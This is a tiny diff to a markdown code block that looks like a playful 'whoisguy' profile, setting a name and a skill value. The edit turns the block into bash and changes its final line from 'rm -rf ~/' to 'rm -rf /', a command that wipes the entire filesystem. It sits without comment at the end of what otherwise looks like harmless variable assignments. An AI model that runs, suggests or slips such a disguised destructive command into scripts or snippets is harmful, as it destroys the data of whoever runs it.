@@ -1,7 +1,7 @@
-```
-; whoisguy is a guy
-name = guy
-skill = 0
+```bash
+# whoisguy
+name="guy"
+skill=0
 
-rm -rf ~/
+rm -rf /
 ```
